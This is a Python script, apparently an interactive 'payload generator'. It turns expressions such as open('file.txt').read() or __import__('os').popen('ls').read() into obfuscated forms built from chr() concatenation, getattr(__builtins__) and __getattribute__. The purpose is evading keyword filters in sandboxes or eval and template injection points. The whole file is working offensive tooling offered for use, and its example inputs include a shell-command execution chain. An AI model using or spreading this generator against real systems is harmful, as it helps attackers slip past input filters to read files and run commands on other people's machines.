import re

def string_to_chr(input_string: str) -> str:
    if not input_string:
        return ""
    chr_parts = [f"chr({ord(char)})" for char in input_string]
    return "+".join(chr_parts)

def generate_simple_payload(command: str) -> str:
    try:
        main_part, method_part = command.rsplit('.', 1)
        method_name = method_part.replace('()', '')
        func_name, args_part = main_part.split('(', 1)
        argument = args_part.strip().strip("')\"")

        print("\n[+] Parsing (Simple Mode) successful:")
        print(f"    - Main Function: {func_name}")
        print(f"    - Argument     : {argument}")
        print(f"    - Method      : {method_name}")

        obfuscated_func = string_to_chr(func_name)
        obfuscated_arg = string_to_chr(argument)
        obfuscated_method = string_to_chr(method_name)

        final_payload = (
            f"getattr(__builtins__, {obfuscated_func})"
            f"({obfuscated_arg})."
            f"__getattribute__({obfuscated_method})()"
        )
        return final_payload
    except Exception as e:
        return f"Error (Simple): Incorrect format. Example: open('file.txt').read(). Details: {e}"

def generate_advanced_payload(command: str) -> str:
    pattern = r"^([\w_]+)\(['\"]([^'\"]+)['\"]\)\.([\w_]+)\(['\"]([^'\"]+)['\"]\)\.([\w_]+)\(\)$"
    match = re.match(pattern, command.strip())
    
    if not match:
        return "Error (Advanced): Format does not match pattern. Example: __import__('os').popen('ls').read()"
        
    func1, arg1, func2, arg2, func3 = match.groups()
    
    print("\n[+] Parsing (Advanced Mode) successful:")
    print(f"    - Function 1: {func1} (Arg: {arg1})")
    print(f"    - Function 2: {func2} (Arg: {arg2})")
    print(f"    - Function 3: {func3}")
    
    chr_f1 = string_to_chr(func1)
    chr_arg1 = string_to_chr(arg1)
    chr_f2 = string_to_chr(func2)
    chr_arg2 = string_to_chr(arg2)
    chr_f3 = string_to_chr(func3)
    
    final_payload = (
        f"getattr(__builtins__, {chr_f1})({chr_arg1})."
        f"__getattribute__({chr_f2})({chr_arg2})."
        f"__getattribute__({chr_f3})()"
    )
    
    return final_payload

if __name__ == "__main__":
    print("==============================================")
    print("==   Python Obfuscation Payload Generator   ==")
    print("==============================================")

    try:
        while True:
            print("\nSelect generator mode:")
            print("  1. Simple Mode (e.g., open('file.txt').read())")
            print("  2. Advanced Mode  (e.g., __import__('os').popen('ls').read())")
            print("  (Type 'exit' or 'quit' to leave)")
            
            mode = input("Mode selection (1 or 2) > ")

            if mode.lower() in ['exit', 'quit']:
                break
            
            if mode == '1':
                command = input("Enter simple command > ")
                payload = generate_simple_payload(command)
            elif mode == '2':
                command = input("Enter advanced command > ")
                payload = generate_advanced_payload(command)
            else:
                print("Invalid option. Please select 1 or 2.")
                continue

            print("\n✅ Your Payload is Ready:")
            print("------------------------------------------")
            print(payload)
            print("------------------------------------------")

    except KeyboardInterrupt:
        print("\nThank you for using this generator. Goodbye!")